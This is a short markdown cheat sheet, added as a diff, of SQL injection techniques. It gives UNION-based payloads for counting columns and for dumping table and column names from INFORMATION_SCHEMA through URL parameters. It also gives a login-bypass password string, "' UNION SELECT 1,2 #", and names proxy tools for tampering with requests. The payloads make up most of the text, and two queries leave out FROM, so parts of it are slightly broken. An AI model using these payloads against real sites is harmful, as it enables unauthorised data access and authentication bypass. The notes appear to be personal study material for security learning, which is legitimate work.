@@ -1,0 +1,73 @@
+# SQL injection basics
+
+## Find number of return parameters
+
+SELECT 1,2,3 #
+
+Add or remove parameters until there is no more error
+Comment at the end could be needed depending on place the injection is added
+
+
+## Get table names
+
+https://domain/path/-1 UNION SELECT table_schema,table_name FROM INFORMATION_SCHEMA.tables LIMIT 0,1
+
+## Get columns
+
+https://domain/path/-1 UNION SELECT table_name,column_name INFORMATION_SCHEMA.columns LIMIT 480,1
+
+
+Or for a specific table:
+
+https://domain/path/-1 UNION SELECT table_name,column_name INFORMATION_SCHEMA.columns WHERE table_name='name' LIMIT 0,1
+
+Get number of columns:
+
+
+
+SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS
+ WHERE table_catalog = 'database_name' -- the database
+   AND table_name = 'table_name'
+
+
+
+
+## Get specific column entry
+
+SELECT column FROM table LIMIT 0,1
+
+## Entry fields (not url parameters)
+
+* First terminate with " or '
+* Also maybe at space + # to the end of the query
+
+### Login
+
+Either the pwd field or the login can be SQL-ed.
+
+If the server SQL syntax is something like
+
+SELECT * FROM users WHERE username = 'a' AND password ='b'
+
+go for something like as password:
+' UNION SELECT 1,2 #
+
+The ' closes the SQL request. The returned constants by SELECT are used as valid login. The comment at the end removes potential leftovers fromt he original SQL statement
+
+## Tools
+
+Extensions:
+
+* Tamper data
+* https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum/?src=search
+
+Burp suite as proxy
+
+* Foxy proxy is a good addition to switch proxies
+
+
+## Further reading
+
+### SQL injection attacks and defense
+
+https://learning.oreilly.com/library/view/sql-injection-attacks/9781597499637
